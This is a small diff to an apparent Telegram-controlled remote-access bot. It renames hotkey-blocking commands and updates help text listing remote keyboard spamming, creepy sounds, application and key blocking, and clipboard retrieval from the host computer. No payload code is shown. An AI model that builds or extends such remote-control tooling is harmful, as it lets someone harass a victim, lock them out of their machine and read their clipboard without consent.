@@ -79,11 +79,11 @@ def send_welcome(message):
         "/keyboard_spam word/letter - Spam a specified letter or word infinitely\n"
         "/keyboard_spam_stop - Stop keyboard spamming\n"
         "/sound - Play creepy sounds\n"
-        "/block_app - Block a specific application\n"
+        "/block_app app.exe - Block a specific application\n"
         "/stop_blocking_app - Unblock all applications\n"
-        "/block_keys - Block specific Hotkeys\n"
-        "/unblock_keys - Unblock all Hotkeys\n"
-        "/block_keys_kb - Block specific keys\n"
+        "/block_hotkeys hotkey1;hotkey2 - Block specific Hotkeys\n"
+        "/unblock_hotkeys - Unblock all Hotkeys\n"
+        "/block_keys_kb a;b;c - Block specific keys\n"
         "/unblock_keys_kb - Unblock all keys\n"
         "/buffer - Retrieve the computer's buffer information\n"
     )
@@ -106,7 +106,7 @@ blocking_active = False
 keys_to_block = []
 hotkeys_to_block = []
 
-@bot.message_handler(commands=['block_keys'])
+@bot.message_handler(commands=['block_hotkeys'])
 def block_keys(message):
     global blocking_active, hotkeys_to_block
 
@@ -134,7 +134,7 @@ def block_keys(message):
 
     threading.Thread(target=block_hotkeys_thread, daemon=True).start()
 
-@bot.message_handler(commands=['unblock_keys'])
+@bot.message_handler(commands=['unblock_hotkeys'])
 def unblock_keys(message):
     global blocking_active, hotkeys_to_block
 
